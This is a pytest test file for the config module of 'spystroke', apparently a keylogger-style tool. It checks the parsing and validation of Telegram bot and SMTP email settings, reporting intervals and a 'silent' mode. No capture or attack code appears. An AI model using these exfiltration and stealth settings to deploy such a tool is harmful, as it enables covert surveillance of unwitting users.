"""Tests for spystroke.config: environment parsing and validation."""

import pytest

from spystroke.config import (
    EmailConfig,
    TelegramConfig,
    load_email_config,
    load_telegram_config,
)


@pytest.fixture
def clean_env(monkeypatch):
    """Remove all SPYSTROKE_* variables before each test."""
    for key in list(__import__("os").environ):
        if key.startswith("SPYSTROKE_"):
            monkeypatch.delenv(key, raising=False)
    yield monkeypatch


class TestLoadTelegramConfig:
    def test_defaults_without_env(self, clean_env):
        config = load_telegram_config()
        assert config.bot_token == ""
        assert config.chat_id == ""
        assert config.interval == 10
        assert config.silent is False
        assert config.log_file is None

    def test_full_config(self, clean_env):
        clean_env.setenv("SPYSTROKE_BOT_TOKEN", "123:abc")
        clean_env.setenv("SPYSTROKE_CHAT_ID", " 42 ")
        clean_env.setenv("SPYSTROKE_INTERVAL", "25")
        clean_env.setenv("SPYSTROKE_SILENT", "1")
        clean_env.setenv("SPYSTROKE_LOG_FILE", "logs/app.log")

        config = load_telegram_config()
        assert config.bot_token == "123:abc"
        assert config.chat_id == "42"  # whitespace stripped
        assert config.interval == 25
        assert config.silent is True
        assert config.log_file == "logs/app.log"

    def test_invalid_interval_falls_back_to_default(self, clean_env):
        clean_env.setenv("SPYSTROKE_INTERVAL", "not-a-number")
        assert load_telegram_config().interval == 10

    def test_validate_raises_without_token(self, clean_env):
        with pytest.raises(ValueError, match="bot token"):
            TelegramConfig(bot_token="", chat_id="123").validate()

    def test_validate_raises_without_chat_id(self, clean_env):
        with pytest.raises(ValueError, match="chat ID"):
            TelegramConfig(bot_token="123:abc", chat_id="").validate()

    def test_validate_rejects_placeholder_values(self, clean_env):
        with pytest.raises(ValueError, match="bot token"):
            TelegramConfig(
                bot_token="Your_Telegram_bot_Token", chat_id="123"
            ).validate()

    def test_validate_rejects_non_positive_interval(self, clean_env):
        with pytest.raises(ValueError, match="positive"):
            TelegramConfig(bot_token="t", chat_id="c", interval=0).validate()

    def test_valid_config_passes(self, clean_env):
        TelegramConfig(bot_token="t", chat_id="c", interval=5).validate()


class TestLoadEmailConfig:
    def test_defaults_without_env(self, clean_env):
        config = load_email_config()
        assert config.email == ""
        assert config.password == ""
        assert config.interval == 120
        assert config.smtp_host == "smtp.gmail.com"
        assert config.smtp_port == 587
        assert config.smtp_tls is True

    def test_full_config(self, clean_env):
        clean_env.setenv("SPYSTROKE_EMAIL", "me@example.com")
        clean_env.setenv("SPYSTROKE_EMAIL_PASSWORD", "secret")
        clean_env.setenv("SPYSTROKE_RECEIVER", "other@example.com")
        clean_env.setenv("SPYSTROKE_INTERVAL", "60")
        clean_env.setenv("SPYSTROKE_SMTP_HOST", "smtp.mailgun.org")
        clean_env.setenv("SPYSTROKE_SMTP_PORT", "465")
        clean_env.setenv("SPYSTROKE_SMTP_TLS", "0")

        config = load_email_config()
        assert config.email == "me@example.com"
        assert config.password == "secret"
        assert config.receiver == "other@example.com"
        assert config.interval == 60
        assert config.smtp_host == "smtp.mailgun.org"
        assert config.smtp_port == 465
        assert config.smtp_tls is False

    def test_validate_raises_without_email(self, clean_env):
        with pytest.raises(ValueError, match="Sender email"):
            EmailConfig(email="", password="x").validate()

    def test_validate_raises_without_password(self, clean_env):
        with pytest.raises(ValueError, match="password"):
            EmailConfig(email="a@b.c", password="").validate()

    def test_valid_config_passes(self, clean_env):
        EmailConfig(email="a@b.c", password="p").validate()
